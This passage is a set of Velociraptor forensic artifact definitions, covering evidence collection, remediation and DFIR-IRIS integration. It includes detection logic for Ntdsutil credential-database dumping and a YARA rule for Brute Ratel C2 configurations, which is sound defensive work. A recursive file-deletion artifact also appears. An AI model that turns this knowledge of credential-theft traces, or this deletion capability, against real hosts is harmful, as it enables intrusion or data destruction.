         FROM glob(globs="/clients/*/collections/*", accessor="fs")
         WHERE NOT FlowID =~ ".db"

     -- An OrphanedFlows is a flow that does not have a metadata record
     -- but still has some data.
     LET OrphanedFlows = SELECT file_store(path=OSPath.String) AS Path,
         ClientId, FlowID, {
            SELECT * FROM flows(client_id=ClientId, flow_id=FlowID)
         } AS Details, Du(OSPath=OSPath, Accessor="fs") AS Size
         FROM FlowDirs
         WHERE NOT Details AND Size > 0
         ORDER BY Size DESC

     SELECT Path, ClientId, FlowID, Size, humanize(bytes=Size) AS HumanSize
     FROM OrphanedFlows

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.BrowserExtensions.yaml
======
name: Linux.Collection.BrowserExtensions
author: alternate
description: |
  Collect Browser Extensions and upload them.
  Based on TriageWebBrowserExtensions from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: ChromiumBasedBrowsersExtensions
  default: |
    ["/{root,home/*}/.config/google-chrome/*/Extensions/**10",
     "/{root,home/*}/.config/yandex-browser-beta/*/Extensions/**10",
     "/{root,home/*}/.config/chromium/*/Extensions/**10",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Extensions/**10",
     "/{root,home/*}/.config/BraveSoftware/Brave-Browser/*/Extensions/**10",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Extensions/**10",
     "/{root,home/*}/.config/opera/*/Extensions/**10",
     "/{root,home/*}/.config/google-chrome-beta/*/Extensions/**10",
     "/{root,home/*}/snap/chromium/common/chromium/*/Extensions/**10"]

- name: ChromiumBasedBrowsersExtensionActivitySQLiteDatabaseFile
  default: |
    ["/{root,home/*}/.config/google-chrome-beta/*/Extension Activity",
     "/{root,home/*}/.config/google-chrome/*/Extension Activity",
     "/{root,home/*}/.config/yandex-browser-beta/*/Extension Activity",
     "/{root,home/*}/.config/BraveSoftware/Brave-Browser/*/Extension Activity",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Extension Activity",
     "/{root,home/*}/.config/opera/*/Extension Activity",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Extension Activity",
     "/{root,home/*}/.config/chromium/*/Extension Activity",
     "/{root,home/*}/snap/chromium/common/chromium/*/Extension Activity"]

- name: ChromePreferences
  default: |
    ["/{root,home/*}/.config/chromium/*/Secure Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Secure Preferences",
     "/{root,home/*}/.config/google-chrome/*/Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Secure Preferences",
     "/{root,home/*}/.config/google-chrome/*/Secure Preferences",
     "/{root,home/*}/.config/chromium/*/Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Preferences"]

- name: FirefoxAddOns
  default: |
    ["/{root,home/*}/.mozilla/firefox/*/webapps/webapps.json",
     "/{root,home/*}/.mozilla/firefox/*/addons.json",
     "/{root,home/*}/.mozilla/firefox/*/extensions.json"]

sources:
- name: uploadChromiumBasedBrowsersExtensions
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ChromiumBasedBrowsersExtensions))


- name: uploadChromiumBasedBrowsersExtensionActivitySQLiteDatabaseFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ChromiumBasedBrowsersExtensionActivitySQLiteDatabaseFile))

- name: uploadChromePreferences
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ChromePreferences))

- name: uploadFirefoxAddOns
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=FirefoxAddOns))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Ntdsutil.yaml
======
name: Windows.Detection.Ntdsutil
author: Matt Green - @mgreen27
description: |
   This artifact will extract evidence of Ntdsutil abuse from the application 
   eventlog. The artifact targets the string "ntds.dit" in event IDs: 216, 325,
   326 and 327.
   
reference:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Ntdsutil/

parameters:
   - name: TargetGlob
     default: '%SystemRoot%\System32\Winevt\Logs\Application.evtx'
   - name: TargetVSS
     type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT EventTime,
        Computer,Channel,EventID,EventRecordID,Message,EventData,FullPath
      FROM Artifact.Windows.EventLogs.EvtxHunter(
        EvtxGlob=TargetGlob,
        IdRegex='^(216|325|326|327)$',
        IocRegex='ntds\.dit',
        SearchVSS=TargetVSS)

---END OF FILE---

======
FILE: /content/exchange/artifacts/IRIS.Timeline.Add.yaml
======
name: IRIS.Timeline.Add

author: Stephan Mikiss @stephmikiss (SEC Defence @SEC Consult) | Updated 2024-08 - [10root Cyber Security] (https://10root.com)

description: |
   Adds Velociraptor rows as timeline entries to [DFIR-IRIS](https://dfir-iris.org/).

   Links the assets and IOCs as specified in the parameters. Additionally, if the client does not yet exist in Iris, this artifact will leverage the **IRIS.Sync.Asset** artifact to add the asset to Iris first and link it in the event.

   *Tested with Dfir-Iris API v2.0.4 (IRIS v2.4.7)*

   #### Notes:

   - The following parameters are *mandatory*:
     1. **Timestamp**: This specifies the name of the field in the source containing the event timestamp. For this artifact to parse it correctly the field should contain a parsed timestamp object. If you are using this artifact from a global notebook then the field is probably already parsed. If not then you should ensure that it is parsed in your source using the `timestamp` function.
     2. **Title**: This specifies the name of the field in the source containing the event title which will be used on the Iris timeline.

   #### Hints:

   - It is **recommended** to add the parameters with 'Iris' prefix to the <a href="#/host/server">Server Metadata</a> to ease the usage of the artifact. The metadata can alternatively be set from a notebook using VQL similar to this example:

   ```
   SELECT server_set_metadata(IrisURL="https://dfir-iris.local:4433",IrisKey="This-is-an_API_KEY",IrisCaseId="1",IrisRootCA='''-----BEGIN CERTIFICATE-----
   <...>
   -----END CERTIFICATE-----'''),server_metadata() FROM scope()
   ```

   - The true power of this artifact lies in the ability to quickly add many entries to DFIR-IRIS. You will *most likely use this artifact from within a notebook*.
   - There is a basic mechanism established to stop duplicates from being added. An event is compared to existing entries based on asset name, flow id, timestamp and the description. You can add multiple events happening at the same time for the same asset originating from the same flow as long as the description varies, e.g. by including dynamic details of the activity that differentiates between the events at the same time like a process name.

   #### Notebook usage example:

   ```VQL
   LET ClientId <= '''C.daa3bab35a125058'''
   LET FlowId <= '''F.CPTTPTRO63LF6'''
   LET ArtifactName <= '''Windows.Timeline.MFT'''

   -- This is the query that should return the events you want to add to Iris.
   -- You might want to add a WHERE clause to filter out unwanted events or
   -- select only specific fields. In this example we limit it to 10 records.
   LET eventsToAdd = SELECT * FROM source(artifact=ArtifactName)
                     LIMIT 10

   SELECT * FROM foreach(
     row={
       SELECT to_dict(item=_value) AS event,
              serialize(format="json", item=_value) AS raw_event
       FROM items(item={ SELECT * FROM eventsToAdd })
     },
     query={
       SELECT *
       FROM Artifact.Exchange.IRIS.Timeline.Add(
         AdditionalAssetId="1,2,3",
         AddToGraph=true,
         AddToSummary=false,
         IocId="8,9,10",
         Category="pers",
         clientId=ClientId,
         Description=format(
           format="Malicious file dropped to the system to establish persistence.\nFile path: %v\nActivity: %v",
           args=[event.path, event.message]),
         RawEvent=raw_event,
         DisableSSLVerify=true,
         FlowId=FlowId,
         Timestamp=event.event_time,
         Title="Persistence established via Autostart Location")
     },
     async=false)
   ```
   **ATTENTION: ALWAYS USE ASYNC=FALSE OTHERWISE ANY ASSETS THAT NEED TO BE CREATED MIGHT BE DUPLICATED!!!**

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: SERVER

parameters:
  - name: clientId
    description: Client Id of the client that should be synced to DFIR-IRIS
  - name: AdditionalAssetId
    description: Comma seperated list of IRIS AssetIds of additional assets beside the client to link in this event.
  - name: IocId
    description: Comma seperated list of IRIS IocIds to link IOCs in this event.
  - name: Timestamp
    description: Timestamp of the event as a time.Time object. This can be a field in the source data containing a timestamp object.
  - name: Title
    description: Title of the event.
  - name: FlowId
    description: FlowId or HuntId of the event source. This is needed to allow detection of duplicates!
  - name: Tags
    description: List of comma seperated tags to be added to the event.
  - name: Description
    description: Description of the event. Very important to actually understand what this entry is all about :)
  - name: AddToSummary
    description: Add it to timeline summary?
    type: bool
  - name: AddToGraph
    description: Add it to attack graph?
    type: bool
  - name: Category
    description: "Category of the action, mostly MITRE Enterprise Tactics. Allowed options are abbreviations and their MITRE ID: tbd,legit,rem,ini,exec,pers,priv,def,creds,disc,lat,coll,c2,exfil,imp"
    type: choices
    choices:
      - tbd
      - legit
      - rem
      - ini
      - exec
      - pers
      - priv
      - def
      - creds
      - disc
      - lat
      - coll
      - c2
      - exfil
      - imp
  - name: Color
    description: Specify the color for this event in Iris. Green by default for obvious reasons.
    type: choices
    choices:
      - green
      - white
      - blue
      - lightblue
      - purple
      - red
      - orange
  - name: RawEvent
    description: Add the raw event, message or the entire row as additional information.
  - name: IrisURL
    type: server_metadata
    description: URL of DFIR-IRIS. Preferred method is to use the server metadata
  - name: IrisKey
    type: server_metadata
    description: API Key of DFIR-IRIS. Preferred method is to use the server metadata
  - name: IrisCaseId
    type: server_metadata
    description: Case ID of the current case. Preferred method is to use the server metadata
  - name: IrisRootCA
    type: server_metadata
    description: RootCA of DFIR-IRIS for self-signed or internal certificates of DFIR-IRIS. Preferred over completely skipping SSL verification.
  - name: DisableSSLVerify
    type: bool
    default: false
    description: Disable TLS verification for HTTPS request to DFIR-IRIS.

sources:

  - query: |

      LET metadata_preparation = SELECT client_metadata(client_id=clientId) as metadata FROM scope() WHERE metadata.IRIS_AssetId

      LET syncAsset = SELECT * FROM Artifact.Exchange.IRIS.Sync.Asset(clientId=clientId,IrisURL=IrisURL,IrisCaseId=IrisCaseId,IrisKey=IrisKey,IrisRootCA=IrisRootCA,DisableSSLVerify=DisableSSLVerify)

      LET eventAsset1 = if(condition=metadata_preparation,then=array(a=metadata_preparation.metadata[0].IRIS_AssetId),else=if(condition=syncAsset.Result[0]="SUCCESS",then=array(a=metadata_preparation.metadata[0].IRIS_AssetId),else=[]))

      LET eventAsset2 = if(condition=AdditionalAssetId,then=split(string=AdditionalAssetId,sep=",|;"),else=[])

      LET eventCategory = if(condition=Category=~"^legit",then=2,
                    else= if(condition=Category=~"^rem",then=3,
                    else= if(condition=Category=~"^ini|^ta0001$",then=4,
                    else= if(condition=Category=~"^exec|^ta0002$",then=5,
                    else= if(condition=Category=~"^pers|^ta0003$",then=6,
                    else= if(condition=Category=~"^priv|^ta0004$",then=7,
                    else= if(condition=Category=~"^def|^ta0005$",then=8,
                    else= if(condition=Category=~"^cred|^ta0006$",then=9,
                    else= if(condition=Category=~"^disc|^ta0007$",then=10,
                    else= if(condition=Category=~"^lat|^ta0008$",then=11,
                    else= if(condition=Category=~"^coll|^ta0009$",then=12,
                    else= if(condition=Category=~"^c2|^com|^ta0011$",then=13,
                    else= if(condition=Category=~"^exf|^ta0010$",then=14,
                    else= if(condition=Category=~"^imp|^ta0040$",then=15,
                    else= 1))))))))))))))

      LET eventColor = if(condition=Color =~ "^white",then="#fff",
                else = if(condition=Color =~ "^blue",then="#1572E899",
                else = if(condition=Color =~ "^purple",then="#6861CE99",
                else = if(condition=Color =~ "^lightblue",then="#48ABF799",
                else = if(condition=Color =~ "^red",then="#F2596199",
                else = if(condition=Color =~ "^orange",then="#FFAD4699",
                else = "#31CE3699"))))))

      LET eventDate = format(format="%d-%02d-%02dT%02d:%02d:%02d.%03.f", args=[
                                      Timestamp.Year, Timestamp.Month, Timestamp.Day,
                                      Timestamp.Hour, Timestamp.Minute, Timestamp.Second,
                                      Timestamp.Nanosecond / 1000000
                            ])

      LET eventProperties = serialize(
                            item=dict(
                                event_title=Title,
                                event_source=if(condition=FlowId,then=format(format="Velo: %v",args=[FlowId]),else="Velo"),
                                event_assets=if(condition=eventAsset1 OR eventAsset2,then=eventAsset1 + eventAsset2,else=[]),
                                event_iocs=if(condition=IocId,then=split(string=IocId,sep=",|;"),else=[]),
                                event_tags=if(condition=Tags,then=format(format="Velo,%v",args=[Tags]),else="Velo"),
                                event_category_id=eventCategory,
                                event_in_summary=AddToSummary,
                                event_in_graph=AddToGraph,
                                event_color=eventColor,
                                event_date=eventDate,
                                event_tz="+00:00",
                                event_content=Description,
                                event_raw=RawEvent
                            )
                            ,format="json"
                        )

      LET apiRequestIrisAddEvent =
          SELECT *
          FROM http_client(
              data=eventProperties,
              headers=dict(`Content-Type`="application/json", `Authorization`=format(format="Bearer %v", args=[IrisKey])),
              skip_verify=DisableSSLVerify,
              root_ca=IrisRootCA,
              method="POST",
              url=format(format="%v/case/timeline/events/add?cid=%v", args=[IrisURL,IrisCaseId]))

      LET resolveHostname = SELECT os_info.hostname as hostname from clients(client_id=clientId)

      LET filterParams = dict(cid=IrisCaseId,q=format(format='{"asset":["%v"],"source":["%v"],"startDate":["%v"],"endDate":["%v"]}',args=[resolveHostname.hostname[0],FlowId,eventDate,eventDate]))

      LET checkExistingEntries =
          SELECT * FROM flatten(query={ SELECT parse_json(data=Content).data.timeline as Timeline
                                        FROM http_client(
                                            headers=dict(`Content-Type`="application/json", `Authorization`=format(format="Bearer %v", args=[IrisKey])),
                                            method="GET",
                                            root_ca=IrisRootCA,
                                            skip_verify=DisableSSLVerify,
                                            params=filterParams,
                                            url=format(format="%v/case/timeline/advanced-filter", args=[IrisURL])) GROUP BY Timeline })
                                       WHERE base64encode(string=Timeline.event_content) = base64encode(string=Description)

      SELECT * FROM if(condition=checkExistingEntries,
                then={SELECT "Already Added -> Skipping the event. Check for existing entries manually!" as Action FROM scope()},
                else={SELECT "Needs to be added" as Action, if(condition= Response=200,then="SUCCESS",else="ERROR") as Result,
                      parse_json(data=eventProperties) AS _RequestData, parse_json(data=Content).data as _ResponseData
                      FROM apiRequestIrisAddEvent})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.AppCompatPCA.yaml
======
name: Windows.System.AppCompatPCA
description: |
   Parse the Program Compatibility Assistant launch dictionary for executable launch times.

author: Eric Capuano - @eric_capuano@infosec.exchange

reference:
  - https://aboutdfir.com/new-windows-11-pro-22h2-evidence-of-execution-artifact/

type: CLIENT
parameters:
  - name: FileGlob
    default: C:\Windows\appcompat\pca\PcaAppLaunchDic.txt
  - name: ExecutableRegex
    description: "Regex of EXE of interest."
    default: .
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool

sources:
  - query: |

      -- expand provided glob into a list of paths on the file system (fs)
      LET fspaths <= SELECT FullPath FROM glob(globs=expand(path=FileGlob))

      -- function returning list of VSS paths corresponding to path
      LET vsspaths(path) = SELECT FullPath
        FROM Artifact.Windows.Search.VSS(SearchFilesGlob=path)

      LET parse_log(FullPath) = SELECT FullPath,
          parse_string_with_regex(
            string=Line,
            regex="^(?P<ExePath>[^|]+)\\|" +
              "(?P<LastExecuted>.*)") as Record
        FROM parse_lines(filename=FullPath)
        WHERE Line
          AND Record.ExePath =~ ExecutableRegex

      LET logsearch(PathList) = SELECT * FROM foreach(
            row=PathList,
            query={
                SELECT *
                FROM parse_log(FullPath=FullPath)
            })

      LET include_vss = SELECT * FROM foreach(row=fspaths,
            query={
                SELECT *
                FROM logsearch(PathList={
                        SELECT FullPath FROM vsspaths(path=FullPath)
                    })
                GROUP BY Record
              })

      LET exclude_vss = SELECT * FROM logsearch(PathList={SELECT FullPath FROM fspaths})

      SELECT
        Record.ExePath as ExePath,
        Record.LastExecuted as LastExecuted,
        FullPath
      FROM if(condition=SearchVSS,
            then=include_vss,
            else=exclude_vss)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Carving.SSHLogs.yaml
======
name: Linux.Carving.SSHLogs
description: |
  Linux systems typically store audit events in syslog. In particular successful 
  ssh logins are especially important for some investigations.
  
  Unfortunately they are sometimes deleted by attackers or rotated out. If you 
  are desperate it might be worth trying to carve for ssh login events.
  
  ### NOTES
  
  1. Syslog does not typically store the year in the date - since carving can 
     recover very old records it might be difficult to pinpoint the time.
  2. This artifact will take a long time! You probably will have to increase 
     the timeout. 
  
parameters:
   - name: Device
     default: /dev/root

sources:
  - query: |
        LET GrokRule = '''%{SYSLOGTIMESTAMP:Timestamp} (?:%{SYSLOGFACILITY} )?%{SYSLOGHOST:logsource} %{SYSLOGPROG}: %{DATA:event} %{DATA:method} for (invalid user )?%{DATA:user} from %{IPORHOST:ip} port %{NUMBER:port} ssh2(: %{GREEDYDATA:system.auth.ssh.signature})?'''
        LET YaraRule = '''
        rule X {
            strings:
              $a = /(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec) [0-9]{1,2} [0-9]{2}:[0-9]{2}[^\n]+/s
            condition:
              any of them
        }
        '''
        
        LET Hits = SELECT str(str=String.Data) AS Hit, String.Offset AS Offset
          FROM yara(
             files=Device, accessor="raw_file", end=1024*1024*1024*56,
             rules=YaraRule, number=100000000000)
          WHERE Hit =~ "Accept|Failed"
        
        SELECT * FROM foreach(row={
            SELECT grok(data=Hit, grok=GrokRule) AS Event, Offset
            FROM Hits
            WHERE Event
        }, query={
          SELECT Offset, timestamp(string=Event.Timestamp) AS Time,
                 Event.ip AS IP,
                 Event.logsource AS logsource,
                 Event.event AS Result,
                 Event.method AS Method,
                 Event.user AS AttemptedUser
          FROM scope()
        })


---END OF FILE---

======
FILE: /content/exchange/artifacts/GlobRemediation.yaml
======
name: Windows.Remediation.Glob
author: Matt Green - @mgreen27
description: |
   This artifact uses glob to remove a file or folder.  
   To recursively target a folder: ```C:\folder\path{,\**}```  
   To target multiple folders: ```C:\{folder2\path2{,\**},folder\path{,\**}}``` 
   however advised to just run 2 collections...   
     
    WARNING: There has been a bug in older versions of Velociraptor that ```\**```
    glob path will select all files. PLEASE SCOPE FIRST and use appropriate targeting.
    
type: CLIENT

parameters:
   - name: TargetGlob
     default: C:\Path\to\File
   - name: NoDir
     description: Do not scope folders
     type: bool
   - name: ReallyDoIt
     description: When selected will really remove!
     type: bool

sources:
  - query: |
      LET targets = SELECT * FROM glob(globs=TargetGlob)
        WHERE NOT if(condition=NoDir,
                then= IsDir,
                else= FALSE)
        ORDER BY OSPath DESC -- need to order by path to ensure recursive delete works.
      
      LET delete_targets = SELECT *, rm(filename=OSPath) as Removed FROM targets

      SELECT OSPath,Removed,Size,Mtime,Ctime,Btime,IsDir,IsLink
      FROM if(condition=ReallyDoIt,
            then= delete_targets,
            else= { SELECT *, FALSE as Removed FROM targets } )

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Network.ApplicationLayerFirewall.yaml
======
name: MacOS.Network.ApplicationLayerFirewall
description: |
    This artifact provides information around the configuration of the application firewall for a macOS host. 
    
    This can be useful for auditing to ensure compliance, overall safety, or to identify tampering with allowed application connections or firewall-related restrictions.
    
type: CLIENT

author: Wes Lambert - @therealwlambert

precondition: SELECT OS FROM info() WHERE OS =~ 'darwin'

parameters:
  - name: ALFGlob
    default: /Library/Preferences/com.apple.alf.plist

sources:
  - query: |
      SELECT 
        if(condition=globalstate, then="Enabled", else="Disabled") AS GlobalState,
        if(condition=allowsignedenabled, then="Yes", else="No") AS AllowSigned,
        if(condition=allowdownloadsignedenabled, then="Yes", else="No") AS AllowDLSigned,
        if(condition=loggingenabled, then="Yes", else="No") AS LoggingEnabled,
        if(condition=stealthenabled, then="Yes", else="No") AS StealthEnabled,
        version AS Version,
        explicitauths.id AS ExplicitAuths,
        firewall AS Applications
      FROM plist(file=ALFGlob)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Alerts.TrackNetworkConnections.yaml
======
name: Server.Alerts.TrackNetworkConnections
author: Herbert Bärschneider @SEC Consult
description: |
   This artifact alerts on network connections tracked by Velociraptor on clients.
   Requires the client_event artifact 'Generic.Events.TrackNetworkConnections' to be enabled.
   
   You can filter alerts based on FQDN of the client, process name, remote ip and remote port.
   Only created network connections are alerted on (meaning you don't get an alert when the system removes the connection).
   You should use those filters, else there be spam to be had :D

type: SERVER_EVENT

parameters:
  - name: WebHook
    description: The token URL obtained from Slack/Teams/Discord (or basicly any communication-service that supports webhooks). Leave blank to use server metadata. e.g. https://hooks.slack.com/services/XXXX/YYYY/ZZZZ
  - name: ClientRegex
    type: regex
    description: Regex for filtering on the client fqdn name
  - name: ProcessNameRegex
    type: regex
    description: Regex for filtering on the process name - does not cover full path of the process image
  - name: RemoteIpRegex
    type: regex
    description: Regex for filtering on the remote ip connected to
  - name: RemotePortRegex
    type: regex
    description: Regex for filtering on the remote port connected to

sources:
    - query: |
        SELECT * FROM foreach(
          row={
            SELECT *, client_info(client_id=ClientId).os_info.fqdn AS Fqdn from watch_monitoring(artifact='Exchange.Generic.Events.TrackNetworkConnections')
            WHERE Fqdn =~ ClientRegex AND ProcInfo.Data.Name =~ ProcessNameRegex AND Raddr.IP =~ RemoteIpRegex AND format(format="%v", args=Raddr.Port) =~ RemotePortRegex
              AND Diff =~ "added"
          },
          query={
            SELECT * FROM http_client(
            data=serialize(item=dict(
                text=format(format="client %v has process %v communicate to remote ip %v on remote port %v",
                            args=[Fqdn, ProcInfo.Data.Name, Raddr.IP, Raddr.Port])),
                format="json"),
            headers=dict(`Content-Type`="application/json"),
            method="POST",
            url=WebHook)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.BruteRatel.yaml
======
name: Windows.Detection.BruteRatel
author: Luke Fardell
description: |
  This hunt runts the Immersive Labs yara rule (https://github.com/Immersive-Labs-Sec/BruteRatel-DetectionTools/blob/main/BruteRatel.yar) across select files to identify the known Brute Ratel config strings. 


type: CLIENT
parameters:
  - name: PathGlob
    description: Only file names that match this glob will be scanned.
    default: C:/**/*.{exe,dll,bin,0xH,Svc,PS1}
  - name: UploadHits
    type: bool
  - name: YaraRule
    type: yara
    description: Yara Rule from https://github.com/Immersive-Labs-Sec/BruteRatel-DetectionTools/blob/main/BruteRatel.yar
    default: |
        rule BruteRatelConfig {
        strings:
        $config_block = { 50 48 b8 [8] 50 68}
        $split_marker = { 50 48 b8 [8] 50 48 b8 }

        condition:
        filesize < 400KB and $config_block and #split_marker > 30
        }

sources:
  - query: |
      -- check which Yara to use
      LET yara = SELECT * FROM if(condition=YaraUrl,
            then= { SELECT Content FROM http_client( url=YaraUrl, method='GET') },
            else= { SELECT YaraRule as Content FROM scope() })

      -- first find all matching glob
      LET files = SELECT FullPath, Name, Size, Mtime, Atime, Ctime, Btime
        FROM glob(globs=PathGlob,nosymlink='True')
        WHERE
          NOT IsDir AND NOT IsLink
          AND if(condition=SizeMin,
            then= SizeMin < Size,
            else= True)
          AND if(condition=SizeMax,
            then=SizeMax > Size,
            else= True)
          AND
             ( time_test(stamp=Mtime)
            OR time_test(stamp=Atime)
            OR time_test(stamp=Ctime)
            OR time_test(stamp=Btime))

      -- scan files and only report a single hit.
      LET hits = SELECT * FROM foreach(row=files,
            query={
                SELECT
                    FileName as FullPath,
                    File.Size AS Size,
                    Mtime, Atime, Ctime, Btime,
                    Rule, Tags, Meta,
                    str(str=String.Data) AS HitContext,
                    String.Offset AS HitOffset
                FROM yara(rules=yara.Content[0],files=FullPath)
                LIMIT 1
            })

      -- upload files that have hit
      LET upload_hits=SELECT *,
            upload(file=FullPath) AS Upload
        FROM hits

      -- return rows
      SELECT * FROM if(condition=UploadHits,
        then=upload_hits,
        else=hits)

---END OF FILE---

======
FILE: /content/exchange/artifacts/IRIS.Sync.Asset.yaml
======
name: IRIS.Sync.Asset

author: Stephan Mikiss @stephmikiss (SEC Defence @SEC Consult) | Updated 2024-08 - [10root Cyber Security] (https://10root.com)

description: |
   Synchronizes client information from Velociraptor to [DFIR-IRIS](https://dfir-iris.org/).

   Parses available information from clients such as network interfaces, IP addresses, asset type and applied labels.
   Once it has been added, the asset ID from DFIR-IRIS will be added as client metadata and `IRIS` will be added as label.

   If this artifact is applied on a client that has the asset ID set in its metadata, it won't be readded but rather
   updated: Labels and the compromised status will by synchronized.

   *Tested with Dfir-Iris API v2.0.4 (IRIS v2.4.7)*

   #### Hints:

   - If it fails to add the client to IRIS, it will assign the `IRIS-ERROR` label to it. A successful run afterwards will remove it.
   - It is **recommended** to add the parameters with 'Iris' prefix to the <a href="#/host/server">Server Metadata</a> to ease the usage of the artifact. The metadata can alternatively be set from a notebook using VQL similar to this example:

   ```
   SELECT server_set_metadata(IrisURL="https://dfir-iris.local:4433",
                              IrisKey="This-is-an_API_KEY",
                              IrisCaseId="1",
                              IrisRootCA='''-----BEGIN CERTIFICATE-----
                              <...>
                              -----END CERTIFICATE-----'''),server_metadata() FROM scope()
   ```

   - You can define the compromise status of a system when creating and when updating the information. **However, if an asset is categorized as *compromised*, you cannot change the status using this artifact.** This is a safety measure to mitigate a potential high impact error. Beside that, you can freely change the status between *No*, *Unknown* and *To be determined*.
   - The true power of this artifact lies in the ability to quickly add many clients to DFIR-IRIS. As it is usually not needed to add all clients that are enrolled in Velociraptor to IRIS but rather an excerpt of important, suspicious, or compromised systems, you will *most likely use this artifact from within a notebook*.

   #### Example:

   to add just a few systems and have the results of the operation as JSON:

   ```VQL
   SELECT client_id,{SELECT * FROM Artifact.Exchange.IRIS.Sync.Asset(clientId=client_id,isCompromised="Y")} FROM clients(search="label:compromised")
   ```

   **Example** to add many systems in a performant way and have the results in well-structured columns.

   ```VQL
   SELECT * FROM foreach(row={SELECT * FROM clients(search="label:suspicious")},query={SELECT * FROM Artifact.Exchange.IRIS.Sync.Asset(clientId=client_id,isCompromised="UNK")},async=true)
   ```
   **ATTENTION: ALWAYS USE ASYNC=FALSE IF CLIENTS ARE PRESENT IN THE TABLE MULTIPLE TIMES! OTHERWISE THESE ASSETS MIGHT BE DUPLICATED IN IRIS!!!**

type: SERVER

parameters:
  - name: clientId
    description: Client Id of the client that should be synced to DFIR-IRIS
  - name: isCompromised
    default: TBD
    description: Specify whether this asset should be marked as compromised in IRIS using "Y" (compromised), "N" (not compromised), "TBD" (to be determined), or "UNK" (unknown).
    type: choices
    choices:
      - Y
      - N
      - TBD
      - UNK
  - name: labelIgnoreListRegex
    default: "IRIS|^Workstation$|^Server$|^Domain Controller$|^Linux$"
    description: Labels that should be ignored and not added to IRIS
  - name: IrisURL
    type: server_metadata
    description: URL of DFIR-IRIS. Preferred method is to use the server metadata
  - name: IrisKey
    type: server_metadata
    description: API Key of DFIR-IRIS. Preferred method is to use the server metadata
  - name: IrisCaseId
    type: server_metadata
    description: Case ID of the current case. Preferred method is to use the server metadata
  - name: IrisRootCA
    type: server_metadata
    description: RootCA of DFIR-IRIS for self-signed or internal certificates of DFIR-IRIS. Preferred over completely skipping SSL verification.
  - name: DisableSSLVerify
    type: bool
    default: false
    description: Disable TLS verification for HTTPS request to DFIR-IRIS.

sources:
  - query: |

      LET AssetType = SELECT * FROM switch(
        a = {SELECT {
                SELECT if(condition = `Computer Info`.DomainRole =~ "Workstation",
                    then = 9,
                    else = if(condition= `Computer Info`.DomainRole =~ "Server",
                        then = 10,
                        else = if(condition= `Computer Info`.DomainRole =~ "Domain Controller",
                            then = 11
                    )))
                FROM flow_results(client_id=clientId,flow_id=last_interrogate_flow_id,artifact="Generic.Client.Info/WindowsInfo")
              } as AssetTypeId
              FROM clients(client_id=clientId)
              WHERE os_info.system =~ "windows"
        },
        b = {SELECT 3 as AssetTypeId
              FROM clients(client_id=clientId)
              WHERE os_info.system =~ "linux"})

      LET resolveIPs =
          SELECT
            {SELECT `Network Info` FROM flow_results(client_id=client_id,flow_id=last_interrogate_flow_id,artifact="Generic.Client.Info/WindowsInfo")} as NetworkInfo
          FROM clients(client_id=clientId)

      LET primaryIP =
          SELECT parse_string_with_regex(string=if(condition=NetworkInfo[0],then=NetworkInfo[0].IPAddresses,else=NetworkInfo.IPAddresses),regex="(?P<IP>[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})").IP as PrimaryIPv4Address
          FROM resolveIPs

      LET networkInterfaces =
          SELECT parse_string_with_regex(string=NetworkInfo.Caption,regex="^\\[.*\\] (?P<IF>.*)").IF as NetworkInterface,
                            NetworkInfo.IPAddresses as IPAddresses, NetworkInfo.MACAddress as MACAddress
          FROM flatten(query=resolveIPs)

      LET NetInfo =
          SELECT format(format="%v (%v): %v",args=[NetworkInterface,MACAddress,IPAddresses]) AS fmt FROM networkInterfaces

      LET networkInterfacesDescription =
          SELECT join(array=NetInfo.fmt, sep="\n") as NetworkInfo
          FROM NetInfo

      LET labelToTags =
          join(array=filter(list=labels, condition="x=>NOT x =~ labelIgnoreListRegex"),sep=",")

      LET metadata_preparation =
          SELECT client_metadata(client_id=clientId) as metadata FROM scope() WHERE metadata.IRIS_AssetId

      LET assetId =
          SELECT metadata_preparation.metadata[0].IRIS_AssetId as assetId FROM scope()

      LET addMetadata(assetIdValue) =
          SELECT client_set_metadata(client_id=clientId,metadata=client_metadata(client_id=clientId) + dict(IRIS_AssetId=assetIdValue)), client_metadata(client_id=clientId)
          FROM scope()

      LET assetProperties =
          serialize(item=dict(
                    asset_name=format(format="%v",args=[os_info.hostname]),
                    asset_type_id=AssetType.AssetTypeId[0],
                    analysis_status_id=1,
                    asset_compromise_status_id=if(condition=isCompromised=~"^Y$",then=1,else=if(condition=isCompromised=~"^N$",then=2,else=if(condition=isCompromised=~"^UNK$",then=3,else=0))),
                    asset_domain=format(format="%v",args=[join(array=slice(list=split(sep_string=".",string=os_info.fqdn),start=1,end=-1),sep=".")]),
